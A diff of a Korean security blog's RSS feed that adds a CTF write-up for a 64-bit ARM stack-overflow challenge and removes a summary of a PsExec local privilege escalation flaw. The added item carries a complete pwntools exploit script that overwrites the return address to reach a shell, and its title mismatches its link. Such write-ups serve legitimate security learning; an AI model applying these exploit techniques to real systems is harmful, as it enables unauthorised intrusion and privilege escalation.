@@ -255,6 +255,39 @@
     
     <item>
       <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
+      <link>https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/</link>
+      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/</guid>
+      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;baby_RudOlPh는 baby 시리즈 답게 이번 Christmas CTF에서 가장 많은 솔버가 나왔던 문제 중 하나입니다.&lt;br&gt;&lt;img src=&quot;/2020/12/29/l0ch/baby_rudolph/1.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;바이너리를 받고</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>baby_RudOlPh는 baby 시리즈 답게 이번 Christmas CTF에서 가장 많은 솔버가 나왔던 문제 중 하나입니다.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png"></p><p>바이너리를 받고 보호기법과 아키텍쳐를 확인해보면 64bit ARM이고, NX bit만 걸려있는걸 확인할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/2.png"><br>분석해보면 vuln이라는 함수를 대놓고 줍니다. read 함수를 호출하는데 0x100만큼 받아서 stack overwflow가 발생하네요</p><p><img src="/2020/12/29/l0ch/baby_rudolph/3.png"></p><p><code>get_arm</code> 함수를 보면 첫 번째 인자의 값이 <code>0x1225</code> 면 <code>system(&quot;/bin/sh&quot;)</code>을 실행해 쉘을 획득할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/4.png"></p><p><code>ARMmaker</code> 함수에는 인자를 세팅 할 수 있는 gadget이 있네요.</p><ol><li><code>vuln</code> 의 return address를 <code>ARMmaker</code>의 gadget으로 overwrite</li><li>gadget을 통해 인자를 <code>0x1225</code>로 세팅하고 <code>get_arm</code> 호출</li><li>get shell!</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = process(<span class="hljs-string">&quot;./baby_RudOlPh&quot;</span>)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p.recvuntil(<span class="hljs-string">&quot;\\n&quot;</span>)payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span>payload += p64(<span class="hljs-number">0x400724</span>)payload += p64(<span class="hljs-number">0x1225</span>) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">16</span>payload += p64(<span class="hljs-number">0x400738</span>)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/29/l0ch/baby_rudolph/5.png"></p><p>뉴비용 포너블 문제를 내려는데 그냥 내면 심심해서 64bit ARM으로 내봤습니다 ㅎㅎ 역시 많은 분들이 풀어주셨습니다! </p><p>(문제 만드는 시간보다 도커에 세팅하는데 드는 시간이 더 오래 걸렸던 건 비밀..)</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/write-up/">write-up</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/christmas-ctf/">christmas ctf</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
       <link>https://hackyboiz.github.io/2020/12/29/l0ch/picky_eater/</link>
       <guid>https://hackyboiz.github.io/2020/12/29/l0ch/picky_eater/</guid>
       <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
@@ -664,38 +697,6 @@
       
       
       <comments>https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] PsExec Local Privilege Escalation</title>
-      <link>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</link>
-      <guid>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/</guid>
-      <pubDate>Thu, 10 Dec 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/psexec-local-privileg</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/named-pipe/">named pipe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/psexec/">psexec</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/#disqus_thread</comments>
       
     </item>
     
